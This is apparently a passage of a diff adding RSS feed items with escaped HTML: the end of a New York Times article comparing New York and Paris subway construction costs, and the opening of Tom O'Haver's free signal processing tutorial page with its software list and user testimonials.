+&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;473&quot; data-total-count=&quot;21753&quot;&gt;The M.T.A. is partly to blame. Officials have added to the soft costs by struggling to coordinate between vendors, taking a long time to approve plans, insisting on extravagant station designs and changing their minds midway through projects. In 2010, they hired a team of three consultants to work full time on East Side Access “operational readiness” — getting the tunnel ready to open — even though contractors knew construction would not end for another decade.&lt;/p&gt;
+&lt;div id=&quot;story-ad-10&quot; class=&quot;story-ad ad ad-placeholder nocontent robots-nocontent&quot;&gt;
+
+&lt;a class=&quot;visually-hidden skip-to-text-link&quot; href=&quot;https://www.nytimes.com/2017/12/28/nyregion/new-york-subway-construction-costs.html#story-continues-24&quot;&gt;Continue reading the main story&lt;/a&gt;&lt;/div&gt;
+&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;350&quot; data-total-count=&quot;22103&quot; id=&quot;story-continues-24&quot;&gt;Janno Lieber, who joined the M.T.A. as chief development officer in April, acknowledged there were parts of the authority’s project management approach that have been “broken” and “self-defeating.” Changing plans midway through projects is a “huge issue,” as is over-customization of designs and poor management of consultants, he said.&lt;/p&gt;
+&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;174&quot; data-total-count=&quot;22277&quot;&gt;“We just have to do a much better job,” Mr. Lieber said. “We’re relying on these consultants to run our projects, and we’re not getting good results out of them.”&lt;/p&gt;
+&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;62&quot; data-total-count=&quot;22339&quot;&gt;Others have a more skeptical perspective about the soft costs.&lt;/p&gt;
+&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;255&quot; data-total-count=&quot;22594&quot;&gt;Jack Brockway, an executive at Herrenknecht, a German manufacturer of tunnel-boring machines, said he got “stacks and stacks and stacks” of instructions from consultants for his work on the Second Avenue subway, down to details that barely made sense.&lt;/p&gt;
+&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;160&quot; data-total-count=&quot;22754&quot;&gt;“It makes you wonder if it’s really necessary, or if they’re just trying to do something to justify how much they’re getting paid,” Mr. Brockway said.&lt;/p&gt;
+&lt;span class=&quot;visually-hidden&quot;&gt;Photo&lt;/span&gt;
+&lt;div class=&quot;image&quot;&gt;&lt;img src=&quot;https://static01.nyt.com/images/2017/12/29/nyregion/29subway10/29subway10-master1050.jpg&quot; alt=&quot;&quot; class=&quot;media-viewer-candidate&quot; data-mediaviewer-src=&quot;https://static01.nyt.com/images/2017/12/29/nyregion/29subway10/29subway10-superJumbo.jpg&quot; data-mediaviewer-caption=&quot;Workers at a new Metro station in Paris in December. Despite France&amp;#x2019;s strong unions, Paris has lower subway construction costs than New York City because of more efficient staffing, fierce vendor competition and scant use of consultants.&quot; data-mediaviewer-credit=&quot;Pete Kiehart for The New York Times&quot; itemprop=&quot;url&quot; itemid=&quot;https://static01.nyt.com/images/2017/12/29/nyregion/29subway10/29subway10-master1050.jpg&quot;/&gt;&lt;/div&gt;
+&lt;span class=&quot;caption-text&quot;&gt;Workers at a new Metro station in Paris in December. Despite France’s strong unions, Paris has lower subway construction costs than New York City because of more efficient staffing, fierce vendor competition and scant use of consultants.&lt;/span&gt; &lt;span class=&quot;credit&quot; itemprop=&quot;copyrightHolder&quot;&gt;&lt;span class=&quot;visually-hidden&quot;&gt;Credit&lt;/span&gt; Pete Kiehart for The New York Times&lt;/span&gt;
+&lt;h4 class=&quot;story-subheading story-content&quot; data-para-count=&quot;19&quot; data-total-count=&quot;22773&quot;&gt;The View From Paris&lt;/h4&gt;
+&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;116&quot; data-total-count=&quot;22889&quot;&gt;Across the Atlantic Ocean, Paris is working on a project that brings the inefficiency of New York into stark relief.&lt;/p&gt;
+&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;508&quot; data-total-count=&quot;23397&quot;&gt;The project, called the Line 14 extension, is similar to the Second Avenue subway. Both projects extend decades-old lines in the hopes of reducing systemwide overcrowding. Both involved digging through moderately hard soil just north of the city center to make a few miles of tunnel and a few stations about 80 feet underground. Both used tunnel-boring machines made by Herrenknecht. Both faced strict regulations, high density and demands from neighbors, which limited some construction to 12 hours per day.&lt;/p&gt;
+&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;123&quot; data-total-count=&quot;23520&quot;&gt;But while the Second Avenue Subway cost $2.5 billion a mile, the Line 14 extension is on track to cost $450 million a mile.&lt;/p&gt;
+&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;121&quot; data-total-count=&quot;23641&quot;&gt;On a recent afternoon at a Line 14 construction site, an official expressed disbelief that New York was spending so much.&lt;/p&gt;
+&lt;div id=&quot;story-ad-11&quot; class=&quot;story-ad ad ad-placeholder nocontent robots-nocontent&quot;&gt;
+
+&lt;a class=&quot;visually-hidden skip-to-text-link&quot; href=&quot;https://www.nytimes.com/2017/12/28/nyregion/new-york-subway-construction-costs.html#story-continues-25&quot;&gt;Continue reading the main story&lt;/a&gt;&lt;/div&gt;
+&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;151&quot; data-total-count=&quot;23792&quot; id=&quot;story-continues-25&quot;&gt;“We thought ours was expensive,” said Laurent Probst, managing director of Île-de-France Mobilités, which controls transit in the French capital.&lt;/p&gt;
+&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;288&quot; data-total-count=&quot;24080&quot;&gt;As he descended into the hole carved for the future Pont Cardinet station, it became clear how the costs could be so different. Scattered around the cavern were a couple dozen workers, running drills, smoothing over soil and checking electrical systems. Mostly, they worked by themselves.&lt;/p&gt;
+&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;126&quot; data-total-count=&quot;24206&quot;&gt;Mr. Probst, 39, wearing a suit and blue tie under his orange safety jacket, pushed the button to operate the elevator himself.&lt;/p&gt;
+&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;416&quot; data-total-count=&quot;24622&quot;&gt;France’s unions are powerful, but Mr. Probst said they did not control project staffing. Isabelle Brochard of RATP, a state-owned company that operates the Paris Metro and is coordinating the Line 14 project, estimated there were 200 total workers on the job, each earning $60 per hour. The Second Avenue subway project employed about 700 workers, many making double that (although that included health insurance).&lt;/p&gt;
+&lt;p class=&quot;story-body-text story-content&quot; data-para-count=&quot;236&quot; data-total-count=&quot;24858&quot;&gt;The tunnel-boring machine chewing through dirt north of Pont Cardinet — a secondhand machine, Ms. Brochard noted — was staffed by a dozen laborers who bounced between the control room, the cutting wheel and the sides of the machine.&lt;/p&gt;
+&lt;a class=&quot;visually-hidden skip-to-text-link&quot; href=&quot;https://www.nytimes.com/2017/12/28/nyregion/new-york-subway-construction-costs.html#story-continues-26&quot;&gt;Continue reading the main story&lt;/a&gt;</description>
+<pubDate>Fri, 29 Dec 2017 02:28:37 +0000</pubDate>
+<dc:creator>seibelj</dc:creator>
+<og:url>https://www.nytimes.com/2017/12/28/nyregion/new-york-subway-construction-costs.html</og:url>
+<og:type>article</og:type>
+<og:title>The Most Expensive Mile of Subway Track on Earth</og:title>
+<og:description>How excessive staffing, little competition, generous contracts and archaic rules dramatically inflate capital costs for transit in New York.</og:description>
+<og:image>https://static01.nyt.com/images/2017/12/29/nyregion/29subway1/29subway1-facebookJumbo.jpg</og:image>
+<dc:language>en</dc:language>
+<dc:format>text/html</dc:format>
+<dc:identifier>https://www.nytimes.com/2017/12/28/nyregion/new-york-subway-construction-costs.html</dc:identifier>
+</item>
+<item>
+<title>A Pragmatic  Introduction  to Signal Processing</title>
+<link>https://terpconnect.umd.edu/~toh/spectrum/</link>
+<guid isPermaLink="true" >https://terpconnect.umd.edu/~toh/spectrum/</guid>
+<description>&lt;head&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf-8&quot;/&gt;&lt;title&gt;Introduction to Signal Processing: Table of Contents&lt;/title&gt;&lt;meta name=&quot;Description&quot; content=&quot;Introduction to Signal Processing in Analytical Chemistry&quot;/&gt;&lt;meta name=&quot;Keywords&quot; content=&quot;signal processing analytical chemistry spectroscopy tutorial best fast easy free&quot;/&gt;&lt;/head&gt;&lt;body id=&quot;readabilityBody&quot; readability=&quot;93.825746034591&quot;&gt;
+&lt;center readability=&quot;18.82777276826&quot;&gt;
+
+
+&lt;h2&gt; with applications in scientific measurement&lt;br/&gt;&lt;/h2&gt;
+&lt;h3&gt;An illustrated essay with free software to download&lt;/h3&gt;
+&lt;span&gt;This is a work in progress, last updated&lt;/span&gt; &lt;span&gt;&lt;span&gt;December 24&lt;/span&gt;, 2017.&lt;/span&gt; &lt;big&gt;&lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/RecentlyChangedFiles.png&quot;&gt;(Recently updated files)&lt;/a&gt;&lt;/big&gt;
+&lt;p&gt;&lt;big&gt;A &lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/Retirement.pdf&quot;&gt;retirement project&lt;/a&gt; by &lt;a href=&quot;http://terpconnect.umd.edu/%7Etoh/&quot;&gt;Tom O'Haver&lt;/a&gt; , Professor Emeritus&lt;br/&gt;Department of Chemistry and Biochemistry&lt;br/&gt;University of Maryland at College Park&lt;br/&gt;Have a question or suggestion? E-mail me: &lt;a href=&quot;mailto:toh@umd.edu?subject=Index%20to%20Signal%20Processing&quot;&gt;toh@umd.edu&lt;/a&gt;&lt;br/&gt;Join our group on &lt;a href=&quot;https://www.facebook.com/groups/237474013116361/&quot;&gt;Facebook&lt;/a&gt;&lt;/big&gt;&lt;br/&gt;&lt;em&gt;&lt;br/&gt;No cost, no&lt;/em&gt; &lt;em&gt;ads,&lt;/em&gt; &lt;em&gt;no sign-in/registration, no eye candy, no frames, no hype, no Java, no Flash, no kidding. Completely free since 1993.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;big&gt;&lt;strong&gt;This essay&lt;/strong&gt; &lt;strong&gt;is also available as a&lt;/strong&gt; &lt;strong&gt;150-page, &lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/IntroToSignalProcessing.pdf#page=148&quot;&gt;&lt;em&gt;indexed&lt;/em&gt;&lt;/a&gt;, printable document&lt;/strong&gt; &lt;strong&gt;written in OpenOffice and saved in&lt;/strong&gt;&lt;br/&gt;&lt;strong&gt;&lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/IntroToSignalProcessing.odt&quot;&gt;Open Document&lt;/a&gt;*&lt;/strong&gt;&lt;strong&gt;*&lt;/strong&gt; &lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/IntroToSignalProcessing.odt&quot;&gt;&lt;strong&gt;&lt;img alt=&quot;&quot; title=&quot;Download OpenOffice version&quot; src=&quot;https://terpconnect.umd.edu/~toh/spectrum/OOicon.GIF&quot; align=&quot;middle&quot;/&gt;&lt;/strong&gt;&lt;/a&gt;&lt;strong&gt;, &lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/IntroToSignalProcessing.doc&quot;&gt;Word&lt;/a&gt;   &lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/IntroToSignalProcessing.doc&quot;&gt;&lt;img alt=&quot;&quot; title=&quot;Download Word version&quot; src=&quot;https://terpconnect.umd.edu/~toh/spectrum/Wordicon.GIF&quot; align=&quot;middle&quot;/&gt;&lt;/a&gt;, and &lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/IntroToSignalProcessing.pdf&quot;&gt;PDF&lt;/a&gt; &lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/IntroToSignalProcessing.pdf&quot;&gt;&lt;img src=&quot;https://terpconnect.umd.edu/~toh/spectrum/PDFicon.GIF&quot; title=&quot;Download Adobe Acrobat PDF version&quot; alt=&quot;&quot; align=&quot;middle&quot;/&gt;&lt;/a&gt; formats.&lt;/strong&gt; &lt;/big&gt;&lt;strong&gt;&lt;span&gt;December 24&lt;/span&gt;&lt;/strong&gt;&lt;big&gt;&lt;strong&gt;,&lt;/strong&gt; &lt;strong&gt;2017 version.&lt;/strong&gt; &lt;span&gt;&lt;span class=&quot;Apple-converted-space&quot;&gt; &lt;/span&gt;&lt;/span&gt;&lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/Readability.txt&quot;&gt;Readability index&lt;/a&gt;&lt;/big&gt;&lt;br/&gt;&lt;big&gt;A paperback printed version is available from Amazon CreateSpace in &lt;a href=&quot;https://www.amazon.com/Pragmatic-Introduction-Signal-Processing-applications/dp/153335491X/ref=sr_1_1?ie=UTF8&amp;amp;qid=1467636882&amp;amp;sr=8-1&amp;amp;keywords=A+Pragmatic+Introduction+to+Signal+Processing&quot;&gt;black-and-white ($11.00 US)&lt;/a&gt; and in &lt;a href=&quot;https://www.createspace.com/6290279&quot;&gt;color ($30.00 US).&lt;/a&gt;&lt;br/&gt;This entire web site can be downloaded in archived &lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/SPECTRUM.zip&quot;&gt;HTML&lt;/a&gt; format complete with &lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/functions.html&quot;&gt;all linked software&lt;/a&gt; (150 MBytes).&lt;/big&gt; &lt;big&gt;&lt;strong&gt;&lt;br/&gt;&lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/Countries.html&quot;&gt;Who uses this site?&lt;/a&gt;&lt;/strong&gt; &lt;strong&gt;  &lt;/strong&gt; &lt;strong&gt;&lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/#comments&quot;&gt;Feedback from users&lt;/a&gt;&lt;/strong&gt;&lt;/big&gt; &lt;big&gt;&lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/#comments&quot;&gt;&lt;big&gt;&lt;big&gt;&lt;img alt=&quot;&quot; src=&quot;https://terpconnect.umd.edu/~toh/spectrum/updated.gif&quot; width=&quot;44&quot; height=&quot;12&quot; border=&quot;0&quot;/&gt;&lt;/big&gt;&lt;/big&gt;&lt;/a&gt;  &lt;strong&gt;Site search:&lt;/strong&gt;&lt;/big&gt;&lt;br/&gt;&lt;/p&gt;
+
+&lt;/center&gt;
+&lt;div align=&quot;center&quot; readability=&quot;6.5573770491803&quot;&gt;
+&lt;p&gt;* Pragmatic: Relating to matters of fact or practical affairs, often to the exclusion of intellectual or artistic matters; practical as opposed to idealistic.&lt;br/&gt;** What is Open Document format? See &lt;a href=&quot;http://www.coolutils.com/Formats/ODT&quot;&gt;http://www.coolutils.com/Formats/ODT&lt;/a&gt;&lt;/p&gt;
+
+
+&lt;/div&gt;
+
+
+&lt;div&gt;
+
+
+&lt;h3&gt;&lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/#Top&quot;&gt;&lt;big&gt;&lt;big&gt;&lt;big&gt;&lt;span&gt;&lt;span&gt;&lt;img src=&quot;https://terpconnect.umd.edu/~toh/spectrum/btt.png&quot; title=&quot;Back to top of this page.&quot; alt=&quot;&quot; width=&quot;50&quot; height=&quot;50&quot; border=&quot;0&quot; align=&quot;right&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/big&gt;&lt;/big&gt;&lt;/big&gt;&lt;/a&gt;&lt;/h3&gt;
+&lt;hr width=&quot;100%&quot; size=&quot;2&quot;/&gt;&lt;h2&gt;Software used in this essay&lt;br/&gt;&lt;/h2&gt;
+&lt;span&gt;&lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/Matlab.gif&quot;&gt;&lt;img src=&quot;https://terpconnect.umd.edu/~toh/spectrum/Matlab.gif&quot; alt=&quot;&quot; width=&quot;386&quot; vspace=&quot;5&quot; hspace=&quot;5&quot; height=&quot;219&quot; border=&quot;2&quot; align=&quot;middle&quot;/&gt;&lt;/a&gt;&lt;/span&gt;&lt;br/&gt;&lt;h3&gt;&lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/SignalArithmetic.html#Matlab&quot;&gt;Matlab&lt;/a&gt;, a high-performance commercial numerical computing environment and programming language that is widely used in research and education, for Windows, Macintosh, and Linux.&lt;/h3&gt;
+&lt;/div&gt;
+&lt;hr/&gt;&lt;h3&gt;&lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/Octave.gif&quot;&gt;&lt;img alt=&quot;&quot; src=&quot;https://terpconnect.umd.edu/~toh/spectrum/Octave.gif&quot; width=&quot;377&quot; height=&quot;203&quot; border=&quot;2&quot; align=&quot;middle&quot;/&gt;&lt;/a&gt;  &lt;/h3&gt;
+&lt;h3&gt;&lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/SignalArithmetic.html#Octave&quot;&gt;Octave&lt;/a&gt;, a free alternative to Matlab, mostly compatible, for Windows, Macintosh, and Linux.&lt;/h3&gt;
+&lt;hr/&gt;&lt;h3&gt;&lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/SPECTRUMScreenShot.GIF&quot;&gt;&lt;img alt=&quot;&quot; src=&quot;https://terpconnect.umd.edu/~toh/spectrum/SPECTRUMScreenShot.GIF&quot; width=&quot;273&quot; height=&quot;209&quot; border=&quot;2&quot; align=&quot;middle&quot;/&gt;&lt;/a&gt;  &lt;/h3&gt;
+&lt;h3&gt;&lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/SPECTRUM.html&quot;&gt;SPECTRUM&lt;/a&gt;, &lt;span&gt;simple, freeware, 90s-era signal processing program, for&lt;/span&gt; Macintosh OS 8.&lt;/h3&gt;
+&lt;hr width=&quot;100%&quot; size=&quot;2&quot;/&gt;&lt;div align=&quot;center&quot;&gt;&lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/MultipleSmoothingExcel.png&quot;&gt;&lt;img alt=&quot;Click to enlarge&quot; src=&quot;https://terpconnect.umd.edu/~toh/spectrum/MultipleSmoothingExcel.png&quot; width=&quot;226&quot; height=&quot;219&quot; border=&quot;2&quot; align=&quot;middle&quot;/&gt;   &lt;/a&gt; &lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/MultipleSmoothingCalc.png&quot;&gt;&lt;img alt=&quot;Click to enlarge&quot; title=&quot;Click to enlarge&quot; src=&quot;https://terpconnect.umd.edu/~toh/spectrum/MultipleSmoothingCalc.png&quot; width=&quot;251&quot; height=&quot;219&quot; border=&quot;2&quot; align=&quot;middle&quot;/&gt;&lt;/a&gt;&lt;br/&gt;&lt;h3&gt;&lt;strong&gt;Microsoft Excel 2013                    OpenOffice Calc 4.1.1&lt;br/&gt;&lt;/strong&gt;&lt;/h3&gt;
+&lt;/div&gt;
+&lt;h3&gt;&lt;a href=&quot;https://terpconnect.umd.edu/~toh/spectrum/#Top&quot;&gt;&lt;big&gt;&lt;big&gt;&lt;big&gt;&lt;span&gt;&lt;span&gt;&lt;img src=&quot;https://terpconnect.umd.edu/~toh/spectrum/btt.png&quot; title=&quot;Back to top of this page.&quot; alt=&quot;&quot; width=&quot;50&quot; height=&quot;50&quot; border=&quot;0&quot; align=&quot;right&quot;/&gt;&lt;/span&gt;&lt;/span&gt;&lt;/big&gt;&lt;/big&gt;&lt;/big&gt;&lt;/a&gt;&lt;/h3&gt;
+&lt;hr/&gt;&lt;h3&gt;&lt;big&gt;Unsolicited Comments from Users:&lt;/big&gt;&lt;/h3&gt;
+&lt;h4&gt;&lt;big&gt;&quot; &lt;span&gt;It is the best source in the entire internet&lt;/span&gt; with such a detailed information, description, examples and theory provided on programmatic realization of peak related techniques and analysis. &quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;...the most &lt;span&gt;understandable&lt;/span&gt; documentation I’ve ever encountered!&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;p&gt;&lt;span&gt;&lt;big&gt;&quot;&lt;/big&gt;&lt;/span&gt;&lt;span&gt;&lt;span&gt;&lt;big&gt;It is as good as, if not &lt;span&gt;better than, any similar books available&lt;/span&gt; in the market&quot;.&lt;/big&gt;&lt;/span&gt;&lt;/span&gt;&lt;br/&gt;&lt;/p&gt;
+&lt;h4&gt;&lt;big&gt;&quot;...a &lt;span&gt;clear, organized, accessible, and intuitive&lt;/span&gt; resource....&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;I ... have never seen before (I have years of experience in this field) such a &lt;span&gt;complete approach&lt;/span&gt; towards tackling almost all the analysis problems from scratch....&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;I like your writing style because it's &lt;span&gt;clear and concise&lt;/span&gt;, and your prose flows so smoothly.&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;The signal processing topics you cover are so &lt;span&gt;wonderfully practical...truly impressive&lt;/span&gt;.&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;I ... am &lt;span&gt;very impressed with the clarity&lt;/span&gt; of the presentation.&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;... truly &lt;span&gt;one of best&lt;/span&gt; practical description I have ever seen.&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;I&lt;/big&gt; &lt;big&gt;liked the way everything is setup and explained.&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;...I think it's the &lt;span&gt;best explanation I've ever seen&lt;/span&gt;. &quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;...&lt;span&gt;excellent&lt;/span&gt; documentation and coding....&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;...thank you for the &lt;span&gt;immense role&lt;/span&gt; your book has played in my perusal of research....&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&quot;&lt;big&gt;&lt;span&gt;This is...a &lt;span&gt;teaching paradise&lt;/span&gt;..&lt;big&gt;.&lt;/big&gt;&lt;/span&gt;&lt;big&gt;&lt;span&gt;&lt;small&gt;really &lt;span&gt;priceless&lt;/span&gt;.&lt;/small&gt;&lt;/span&gt;&lt;/big&gt;&lt;span&gt;&quot;&lt;br/&gt;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&lt;span&gt;&quot;&lt;span&gt;What you do makes the world better!&lt;/span&gt;&quot;&quot;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&lt;span&gt;&quot;I found your explanation....very &lt;span&gt;simple and clear&lt;/span&gt;. &quot;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&quot;&lt;big&gt;&lt;span&gt;I was really &lt;span&gt;surprised&lt;/span&gt; by the efficiency of your explanations ...&quot;&lt;span&gt;highly realistic and pragmatic&lt;/span&gt;.&quot;&lt;/span&gt;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;The sequence of the topics and the explanations are &lt;span&gt;very clear&lt;/span&gt;.&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;I found your curve fitting website and it is &lt;span&gt;awesome&lt;/span&gt;....&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;&lt;span&gt;Love&lt;/span&gt; your web pages.... MANY thanks for all the effort, hard work and time -- not to mention the &lt;span&gt;clarity&lt;/span&gt;.&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;This site is &lt;span&gt;tremendous&lt;/span&gt;....&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;...[an] &lt;span&gt;indispensable&lt;/span&gt; tool....&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;...I'm &lt;span&gt;astonished&lt;/span&gt; by your work.&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;...your &lt;span&gt;fantastic&lt;/span&gt; article...has helped me a lot&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;...it is an &lt;span&gt;absolutely fantastic&lt;/span&gt; teaching resource.&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;...your Intro. to Signal Proc. book and software ... [is] ... &lt;span&gt;helpful and thorough&lt;/span&gt;.&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;Thanks again for your generous contributions to the scientific and engineering community, you might not get a lot of feedback (or hopefully you do) but your work is greatly appreciated and will continue to benefit us for years to come.&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;...your website...represents a &lt;span&gt;wonderful&lt;/span&gt; job....&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;...such an enormous amount of knowledge and applied code! It is an &lt;span&gt;enormous help&lt;/span&gt; for analysing my data.&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;...an &lt;span&gt;excellent source of information&lt;/span&gt; for a subject that I have only encountered scatterered books.&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;...thank you profusely .... your website has been &lt;span&gt;extremely helpful&lt;/span&gt;.&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;...after days of trying and failing...your site &lt;span&gt;was able to solve my problem in half an hour&lt;/span&gt;.&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&quot;&lt;big&gt;I have no words to describe how helpful this is to me ... explaining what they do and how they can be used; on top the examples make it even better.&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;... &lt;em&gt;surely &lt;span&gt;the way into heaven&lt;/span&gt;&lt;/em&gt; &lt;em&gt;is to post excellent software online for others to use to do science.&lt;/em&gt;&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;...thank you for taking the time to create these &lt;span&gt;incredible&lt;/span&gt; tools.&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&quot;&lt;big&gt;I am grateful and &lt;span&gt;overwhelmed&lt;/span&gt; by your kindness in sharing your hard work with us&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;This is a &lt;span&gt;great&lt;/span&gt; website...&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;...you &lt;span&gt;saved my time&lt;/span&gt; a lot.&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;Your effort to produce and maintain this site is &lt;span&gt;GREATLY appreciated&lt;/span&gt;.&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;Your online resource for “signal processing” is &lt;span&gt;fantastic!&lt;/span&gt;&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot; I found your essay to be &lt;span&gt;extremely helpful&lt;/span&gt;.&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;...such &lt;span&gt;useful&lt;/span&gt; tools and educational materials!&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;...your webpage about signal processing ... was &lt;span&gt;very helpful&lt;/span&gt; to me.&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;...&lt;span&gt;great material&lt;/span&gt; on the subject.&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;...very much &lt;span&gt;helping and informative&lt;/span&gt;.&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;&lt;span&gt;Wonderful&lt;/span&gt; site. I have already added it to my favorites.&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;Your web pages are a &lt;span&gt;fantastic resource&lt;/span&gt;.&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;...your signal processing website, book, and Matlab codes ... embodied &lt;span&gt;the solution I was searching for&lt;/span&gt;.&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot; I cannot wait to start class and utilize the &lt;span&gt;marvelous&lt;/span&gt; tool that you have provided for us.&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;Without your website, I wouldn't know what to do.&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot; ... a &lt;span&gt;splendid&lt;/span&gt; program.&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;...really an &lt;span&gt;excellent&lt;/span&gt; source of information....&quot;&lt;br/&gt;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&quot;&lt;big&gt;I find your work on Signal Processing &lt;span&gt;extremely helpful&lt;/span&gt;....&quot;&lt;/big&gt;&lt;/h4&gt;
+&lt;h4&gt;&lt;big&gt;&quot;...&lt;span&gt;easy to use and understand&lt;/span&gt;...&quot;&lt;/big&gt;&lt;/h4&gt;
